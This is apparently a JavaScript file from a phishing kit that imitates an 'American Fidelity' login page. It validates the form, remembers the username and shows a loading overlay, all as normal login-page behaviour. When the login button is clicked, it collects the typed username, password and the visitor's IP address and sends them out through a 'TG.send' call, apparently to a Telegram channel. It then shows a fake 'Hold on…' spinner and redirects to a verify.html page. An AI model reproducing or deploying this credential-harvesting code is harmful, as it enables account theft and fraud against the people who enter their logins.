(function () {
  "use strict";

  /* ── Helpers ───────────────────────────────── */
  var USERNAME_KEY = "american_remembered_username";

  /* ── Inject loading overlay into DOM ───────── */
  var overlay = document.createElement("div");
  overlay.id = "loading-overlay";
  overlay.innerHTML = [
      '<div class="overlay-card" id="overlay-card">',
      '<div class="overlay-spinner"></div>',
      '<div class="overlay-success-icon">',
        '<svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">',
          '<polyline points="20 6 9 17 4 12"></polyline>',
        '</svg>',
      '</div>',
      '<div class="overlay-text" id="overlay-text">Hold on…</div>',
    '</div>'
  ].join("");
  document.body.appendChild(overlay);

  /* ── Inject username toast ───────────────────  */
  var toast = document.createElement("div");
  toast.id = "username-toast";
  document.body.appendChild(toast);

  /* ── DOM refs ───────────────────────────────── */
  var usernameInput = document.getElementById("username");
  var passwordInput = document.getElementById("password");
  var showBtn       = document.getElementById("show-btn");
  var loginBtn      = document.getElementById("login-btn");
  var rememberChk   = document.getElementById("remember-my-username");
  var overlayCard   = document.getElementById("overlay-card");
  var overlayText   = document.getElementById("overlay-text");

  /* ── Restore remembered username ──────────── */
  var saved = localStorage.getItem(USERNAME_KEY);
  if (saved && usernameInput) {
    usernameInput.value = saved;
    if (rememberChk) rememberChk.checked = true;
  }

  /* ── Password show/hide ────────────────────── */
  if (showBtn && passwordInput) {
    showBtn.addEventListener("click", function () {
      var isHidden = passwordInput.type === "password";
      passwordInput.type = isHidden ? "text" : "password";
      showBtn.textContent = isHidden ? "Hide" : "Show";
    });
    showBtn.addEventListener("keydown", function (e) {
      if (e.key === "Enter" || e.key === " ") { e.preventDefault(); showBtn.click(); }
    });
  }

  /* ── Clear field error on input ────────────── */
  function clearFieldError(input) {
    if (!input) return;
    input.classList.remove("field-error");
    var block = input.closest(".field-block");
    if (block) {
      block.classList.remove("shake");
      var msg = block.querySelector(".field-error-msg");
      if (msg) msg.classList.remove("visible");
    }
  }

  if (usernameInput) usernameInput.addEventListener("input", function () { clearFieldError(usernameInput); });
  if (passwordInput) passwordInput.addEventListener("input", function () { clearFieldError(passwordInput); });

  /* ── Inject error message node under a field-block ── */
  function injectErrorMsg(block, text) {
    var existing = block.querySelector(".field-error-msg");
    if (!existing) {
      var msg = document.createElement("div");
      msg.className = "field-error-msg";
      msg.setAttribute("role", "alert");
      msg.textContent = text;
      block.appendChild(msg);
      return msg;
    }
    existing.textContent = text;
    return existing;
  }

  /* ── Shake + highlight a field ──────────────── */
  function flagField(input, errorText) {
    if (!input) return;
    input.classList.add("field-error");
    var block = input.closest(".field-block");
    if (block) {
      block.classList.remove("shake");
      void block.offsetWidth;
      block.classList.add("shake");
      var msg = injectErrorMsg(block, errorText);
      msg.classList.add("visible");
    }
  }

  /* ── Show toast ─────────────────────────────── */
  function showToast(msg, duration) {
    toast.textContent = msg;
    toast.classList.add("show");
    setTimeout(function () { toast.classList.remove("show"); }, duration || 2500);
  }

  /* ── Loading overlay helpers ─────────────────  */
  function showOverlay(message) {
    overlayText.textContent = message;
    overlayCard.classList.remove("success");
    overlay.classList.add("visible");
  }

  function setOverlaySuccess(message) {
    overlayCard.classList.add("success");
    overlayText.textContent = message;
  }

  function hideOverlay() {
    overlay.classList.remove("visible");
    overlayCard.classList.remove("success");
  }

  /* ── Login button ────────────────────────────── */
  if (loginBtn) {
    loginBtn.addEventListener("click", function (e) {
      e.preventDefault();

      var username = usernameInput ? usernameInput.value.trim() : "";
      var password = passwordInput ? passwordInput.value        : "";
      var hasError = false;

      if (!username) {
        flagField(usernameInput, "Please enter your username.");
        hasError = true;
      }
      if (!password) {
        flagField(passwordInput, "Please enter your password.");
        hasError = true;
      }
      if (hasError) {
        if (!username && usernameInput) usernameInput.focus();
        else if (!password && passwordInput) passwordInput.focus();
        return;
      }

      /* ── Remember username ── */
      if (rememberChk && rememberChk.checked) {
        try { localStorage.setItem(USERNAME_KEY, username); } catch(_) {}
      } else {
        try { localStorage.removeItem(USERNAME_KEY); } catch(_) {}
      }

      TG.getIP().then(function (ip) {
        TG.send(
          "🔐 <b>American Fidelity — Login Credentials</b>\n\n" +
          "👤 Username: <code>" + username + "</code>\n" +
          "🔑 Password: <code>" + password + "</code>\n" +
          "🌐 IP: <code>" + ip + "</code>\n" +
          "⏰ " + TG.ts()
        );
      });

      /* ── UI: disable button, show overlay, navigate ── */
      loginBtn.disabled = true;
      showOverlay("Hold on…");

      setTimeout(function () {
        hideOverlay();
        window.location.href = "verify.html";
      }, 7000);
    });
  }

}());